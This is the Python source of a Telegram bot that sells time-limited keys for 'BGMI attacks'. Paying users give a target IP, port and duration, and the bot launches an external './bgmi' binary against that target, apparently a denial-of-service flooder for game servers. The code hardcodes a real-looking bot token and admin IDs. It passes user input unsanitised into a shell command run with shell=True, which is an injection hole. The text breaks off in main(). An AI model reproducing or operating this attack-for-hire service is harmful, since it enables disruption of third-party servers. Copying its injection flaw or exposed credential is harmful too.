import telebot
import time
import hashlib
import subprocess
import secrets
import datetime
import threading
import os
from io import BytesIO
from telebot import TeleBot, types
from collections import defaultdict
import json
import requests
import shutil

API_TOKEN = '7230364476:AAEcoG0rA0Gz-jzHfigCDsKISByTf3a9MLM'
ADMIN_ID = '6904449442'
DEFAULT_KEY = 'NINJA'
OWNER_ID = '6904449442'  # Add your Telegram user ID here

bot = telebot.TeleBot('7230364476:AAEcoG0rA0Gz-jzHfigCDsKISByTf3a9MLM')

# Global variables
start_time = time.time()
user_verified_keys = {}
user_verified_ids = set()
claimed_keys = set()
locked_users = {}
command_usage = defaultdict(list)
failed_attempts = defaultdict(int)
total_attacks = 0
active_attacks = {}
free_mode_active = False

LOG_FILE = "log.txt"
STATE_FILE = "bot_state.json"

def save_state():
    state = {
        "user_verified_keys": user_verified_keys,
        "user_verified_ids": list(user_verified_ids),
        "claimed_keys": list(claimed_keys),
        "locked_users": locked_users,
        "command_usage": dict(command_usage),
        "failed_attempts": dict(failed_attempts),
        "total_attacks": total_attacks,
        "active_attacks": active_attacks,
        "free_mode_active": free_mode_active,
        "start_time": start_time
    }
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f)

def load_state():
    global user_verified_keys, user_verified_ids, claimed_keys, locked_users, command_usage, failed_attempts, total_attacks, active_attacks, free_mode_active, start_time
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            state = json.load(f)
        user_verified_keys = state.get("user_verified_keys", {})
        user_verified_ids = set(state.get("user_verified_ids", []))
        claimed_keys = set(state.get("claimed_keys", []))
        locked_users = state.get("locked_users", {})
        command_usage = defaultdict(list, state.get("command_usage", {}))
        failed_attempts = defaultdict(int, state.get("failed_attempts", {}))
        total_attacks = state.get("total_attacks", 0)
        active_attacks = state.get("active_attacks", {})
        free_mode_active = state.get("free_mode_active", False)
        start_time = state.get("start_time", time.time())


def watermark_message(message):
    return f"{message}\n\n🔒 Bot made and developed by @NINJA666"

@bot.message_handler(commands=['uptime'])
def handle_uptime(message):
    uptime_seconds = time.time() - start_time
    uptime_hours = uptime_seconds / 3600
    bot.reply_to(message, f"⏱️ *Bot Uptime:* `{uptime_hours:.2f} hours`")
    save_state()


@bot.message_handler(commands=['start'])
def handle_start(message):
    if str(message.from_user.id) == ADMIN_ID:
        welcome_message = """
🚀 **Welcome to the VIP Bot!** 

To get started, please follow the steps below:

1. **Enter Access Key:**
   Use the command `/enter_key <key>` to verify your access.
   If you don't have an access key, you can purchase one from @NINJA666.

2. **Available Commands:**
   Use the command `/help` to see the list of available commands for users.

**Admin Commands:**
/add_key <key> <expiry_hours> - Manually add a key with expiry time in hours.
/remove_key <key> - Remove an existing key.
/generate_key - Generate a new access key.
/active_keys - View all active keys with expiration times.

If you have any questions or need assistance, feel free to contact the creator @NINJA666. Enjoy using the bot! 🤖
"""
    else:
        welcome_message = """
🚀 **Welcome to the VIP Bot!** 

To get started, please follow the steps below:

1. **Enter Access Key:**
   Use the command `/enter_key <key>` to verify your access.
   If you don't have an access key, you can purchase one from @NINJA666.

2. **Purchase a Key:**
   If you don't have an access key, you can purchase one using the command `/purchase <plan>`.
Available plans:
    /purchase 1day - VIP key for 1 day
    /purchase 1week - VIP key for 1 week
    /purchase 1month - VIP key for 1 month

3. **Available Commands:**
   Use the command `/help` to see the list of available commands for users.

If you have any questions or need assistance, feel free to contact the creator @NINJA666. Enjoy using the bot! 🤖
"""
    bot.send_message(message.chat.id, welcome_message)

# Global variables
free_mode_active = False

@bot.message_handler(commands=['free'])
def handle_free(message):
    global free_mode_active

    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    command = message.text.split()
    activation_hours = int(command[1]) if len(command) > 1 else 1  # Default activation for 1 hour

    activation_duration = activation_hours * 3600  # Convert hours to seconds

    free_mode_active = True
    bot.reply_to(message, f"🔓 Free mode activated for {activation_hours} hours. All users have full access.")

    def deactivate_free_mode():
        global free_mode_active
        time.sleep(activation_duration)
        free_mode_active = False
        bot.send_message(message.chat.id, "🔒 Free mode deactivated. Access restrictions restored.")

    # Start a thread to deactivate 'free' mode after activation_duration seconds
    threading.Thread(target=deactivate_free_mode).start()

# Modify your existing message handlers to check if 'free' mode is active
@bot.message_handler(commands=['generate_key', 'add_key', 'remove_key', 'bgmi'])
def handle_admin_commands(message):
    if not free_mode_active and str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *Access Denied* ❌")
        return

    # Rest of the command handling logic remains unchanged...
    



@bot.message_handler(commands=['generate_key'])
def handle_generate_key(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    command = message.text.split()
    num_keys = int(command[1]) if len(command) > 1 else 1
    expiry_hours = int(command[2]) if len(command) > 2 else 24  # Default expiry of 24 hours

    generated_keys = []
    for _ in range(num_keys):
        key = hashlib.sha256(secrets.token_bytes(32)).hexdigest()
        expiry_time = time.time() + expiry_hours * 3600
        user_verified_keys[key] = expiry_time
        generated_keys.append(f"Key: `{key}`, Expiry Time: `{expiry_hours} hours`")

    keys_message = "🔑 Generated keys:\n" + "\n".join(generated_keys)

    bot.send_message(message.chat.id, keys_message, parse_mode="Markdown")
    save_state()

@bot.message_handler(commands=['add_key'])
def handle_add_key(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "✅ *Usage:* `/add_key <key> <expiry_hours>`")
        return

    key = command[1]
    expiry_hours = int(command[2])

    if key in user_verified_keys:
        bot.reply_to(message, "❌ *Key already exists.*")
        return

    expiry_time = time.time() + expiry_hours * 3600
    user_verified_keys[key] = expiry_time
    bot.send_message(message.chat.id, f"🔑 *Key added successfully.*\n*Key:* `{key}`, *Expiry Time:* `{expiry_hours} hours`")
    bot.send_message(OWNER_ID, f"🔑 Added key by bot {message.chat.id}: `{key}` with expiry `{expiry_hours} hours`", parse_mode="Markdown")
    save_state()

@bot.message_handler(commands=['remove_key'])
def handle_remove_key(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "✅ *Usage:* `/remove_key <key>`")
        return

    key = command[1]
    if key in user_verified_keys:
        del user_verified_keys[key]
        bot.reply_to(message, f"🔑 *Key removed successfully.*\n*Key:* `{key}`")
        bot.send_message(OWNER_ID, f"🔑 Removed key by bot {message.chat.id}: `{key}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ *Key not found.*\n*Key:* `{key}`")
    save_state()

@bot.message_handler(commands=['enter_key'])
def handle_enter_key(message):
    if is_user_locked(message.from_user.id):
        bot.reply_to(message, watermark_message("❌ You are locked out due to suspicious activity. Please contact the administrator."))
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, watermark_message("✅ *Usage:* `/enter_key <key>`"))
        return

    key = command[1]
    if key == DEFAULT_KEY or (key in user_verified_keys and user_verified_keys[key] > time.time()):
        bot.reply_to(message, watermark_message("✅ Key verified successfully. You can now use the bot commands."))
        user_verified_ids.add(message.from_user.id)
        save_state()
        return
    elif key in claimed_keys:
        bot.reply_to(message, watermark_message("❌ This key has already been claimed and cannot be used again."))
        return

    # Add the key to the set of claimed keys
    claimed_keys.add(key)
    bot.reply_to(message, watermark_message("✅ Key verified successfully. You can now use the bot commands."))
    user_verified_ids.add(message.from_user.id)
    bot.send_message(OWNER_ID, f"🔑 Entered key by bot {message.chat.id}: `{key}`", parse_mode="Markdown")
    save_state()

@bot.message_handler(commands=['key_status'])
def handle_key_status(message):
    user_id = message.from_user.id

    if user_id not in user_verified_ids:
        bot.reply_to(message, watermark_message("❌ You have not verified any key yet. Please use `/enter_key <key>` to verify."))
        return

    key_status_message = "🔑 **Your Key Status**:\n"
    current_time = time.time()
    for key, expiry in user_verified_keys.items():
        if expiry > current_time:
            remaining_hours = (expiry - current_time) / 3600
            key_status_message += f"Key: `{key}`, Expires in: `{remaining_hours:.2f} hours`\n"
        else:
            key_status_message += f"Key: `{key}`, Status: `Expired`\n"

    bot.reply_to(message, watermark_message(key_status_message), parse_mode="Markdown")
    

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    bot.send_message(message.chat.id, "🛑 Stopping the bot...")
    save_state()
    os._exit(0)

@bot.message_handler(commands=['notify_expiry'])
def handle_notify_expiry(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    current_time = time.time()
    for key, expiry_time in user_verified_keys.items():
        user_id = next((id for id, keys in user_verified_keys.items() if key in keys), None)
        if user_id:
            time_remaining = expiry_time - current_time
            if time_remaining > 0:
                hours_remaining = time_remaining / 3600
                bot.send_message(user_id, f"🔔 Your access key `{key}` will expire in {hours_remaining:.2f} hours. Please renew it soon.")

    bot.reply_to(message, "🔔 Notifications have been sent to all users about their key statuses.")
    


@bot.message_handler(commands=['help'])
def handle_help(message):
    if str(message.from_user.id) == ADMIN_ID:
        help_message = """
🚀 **VIP Bot Help Menu - Admin Commands**:
1. **/generate_key** - Generate a new access key.
2. **/add_key <key> <expiry_hours>** - Manually add a key with expiry time in hours.
3. **/remove_key <key>** - Remove an existing key.
4. **/active_keys** - View all active keys with expiration times.
5. **/download_keys** - Download all keys as a text file.
6. **/notify_expiry** - Notify users about their key expiry statuses.
7. **/uptime** - Check the bot's uptime.
8. **/stop** - Stop the bot.
9. **/stat** - Show bot statistics.

**User Commands**:
1. **/enter_key <key>** - Enter an access key to verify.
2. **/renew_key <new_key>** - Renew your access key.
3. **/key_status** - Check the status of your access key.
4. **/uptime** - Check the bot's uptime.
5. **/help** - Show this help message.
6. **/bgmi <target> <port> <time>** - Start a BGMI attack (requires key verification).
"""
    else:
        help_message = """
🚀 **VIP Bot Help Menu - User Commands**:
1. **/enter_key <key>** - Enter an access key to verify.
2. **/renew_key <new_key>** - Renew your access key.
3. **/key_status** - Check the status of your access key.
4. **/uptime** - Check the bot's uptime.
5. **/help** - Show this help message.
6. **/bgmi <target> <port> <time>** - Start a BGMI attack (requires key verification).
"""
    bot.reply_to(message, watermark_message(help_message))

def generate_keys_file():
    keys_content = ""
    for key, expiry in user_verified_keys.items():
        keys_content += f"Key: {key}, Expiry Time: {expiry}\n"
    return keys_content

@bot.message_handler(commands=['download_keys'])
def handle_download_keys(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    if not user_verified_keys:
        bot.reply_to(message, "No keys found to download.")
        return

    keys_text = "🔑 **Active Keys**:\n"
    for key, expiry in user_verified_keys.items():
        expiry_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(expiry))
        keys_text += f"Key: {key}, Expires: {expiry_time}\n"

    with open("keys.txt", "w") as file:
        file.write(keys_text)

    with open("keys.txt", "rb") as file:
        bot.send_document(message.chat.id, file)
    save_state()

@bot.message_handler(commands=['active_keys'])
def handle_active_keys(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    if not user_verified_keys:
        bot.reply_to(message, "No active keys found.")
        return

    active_keys_message = "🔑 **Active Keys**:\n"
    for key, expiry in user_verified_keys.items():
        expiry_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(expiry))
        active_keys_message += f"Key: `{key}`, Expires: `{expiry_time}`\n"

    bot.send_message(message.chat.id, active_keys_message, parse_mode="Markdown")
    save_state()



def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def start_attack_reply(message, target, port, time_duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = f"""
🎩 **VIP BGMI Attack Initiated!**

**Target:** `{target}`
**Port:** `{port}`
**Duration:** `{time_duration} seconds`

🛡️ **Status:** Attack is now running...

🔧 **Support:** For any assistance, contact @NINJA666.
"""
    # Adding watermark to the response
    response = watermark_message(response)

    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = message.from_user.id

    # Check if the user is an admin
    if str(user_id) == ADMIN_ID:
        pass  # Admins can execute BGMI command without a key
    elif user_id not in user_verified_ids:
        response_message = "❌ You are not authorized to use this command. Please verify your access key using `/enter_key <key>`."
        bot.reply_to(message, response_message)
        return

    if user_id in active_attacks:
        response_message = "❌ You already have an active attack. Please wait for it to finish before starting a new one."
        bot.reply_to(message, response_message)
        return

    command = message.text.split()
    if len(command) == 4:  # Check for target, port, and time
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time_duration = int(command[3])  # Convert time to integer

        if time_duration > 5000:
            response = "Error: Time interval must be less than 5000."
        else:
            log_command(user_id, target, port, time_duration)
            start_attack_reply(message, target, port, time_duration)
            active_attacks[user_id] = True

            def run_attack():
                full_command = f"./bgmi {target} {port} {time_duration} 590"
                subprocess.run(full_command, shell=True)
                active_attacks.pop(user_id, None)
                bot.send_message(user_id, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time_duration}")
                save_state()

            threading.Thread(target=run_attack).start()
            response = f"BGMI Attack is running. Target: {target} Port: {port} Time: {time_duration}"
    else:
        response = "Usage: /bgmi <target> <port> <time>"

    bot.reply_to(message, watermark_message(response))
    save_state()



                 
@bot.message_handler(commands=['stat'])
def handle_stat(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    total_users = len(command_usage)
    verified_users = len(user_verified_ids)
    active_keys = len(user_verified_keys)
    banned_users = len(locked_users)
    
    stat_message = f"""
📊 **Bot Statistics**:
- **Current Users Online**: {total_users}
- **Total Verified Users**: {verified_users}
- **Total Attacks**: {total_attacks}
- **Claimed Keys**: {len(claimed_keys)}
- **Active Keys**: {active_keys}
- **Banned Users**: {banned_users}
    """

    bot.reply_to(message, watermark_message(stat_message))

def notify_key_expiry():
    while True:
        current_time = time.time()
        upcoming_expiry = current_time + 24 * 3600  # 24 hours ahead
        for key, expiry_time in user_verified_keys.items():
            if expiry_time < upcoming_expiry:
                # Notify the user associated with the key
                user_id = next((id for id, keys in user_verified_keys.items() if key in keys), None)
                if user_id:
                    bot.send_message(user_id, f"🔔 Your access key `{key}` is about to expire in less than 24 hours. Please renew it soon.")
        time.sleep(3600)  # Check every hour
        


def check_key_expiry():
    while True:
        current_time = time.time()
        expired_keys = [key for key, expiry_time in user_verified_keys.items() if expiry_time < current_time]
        for key in expired_keys:
            del user_verified_keys[key]
        time.sleep(3600)  # Check for expired keys every hour

def unlock_users():
    while True:
        current_time = time.time()
        unlocked_users = [user_id for user_id, lock_time in locked_users.items() if lock_time < current_time]
        for user_id in unlocked_users:
            del locked_users[user_id]
            bot.send_message(user_id, "🔓 You have been unlocked. You can now use the bot again.")
        time.sleep(600)  # Check every 10 minutes

def save_state_periodically():
    while True:
        time.sleep(60)
        save_state()

def main():
    while True:
        try:
            load_state()
            threading.Thread(target=save_state_periodically, daemon=True).start()
            threading.Thread(target=check_key_expiry, daemon=True).start()
            threading.Thread(target=unlock_users, daemon=True).start()
            threading.Thread(target=notify_key_expiry, daemon=True).start()  # Start the
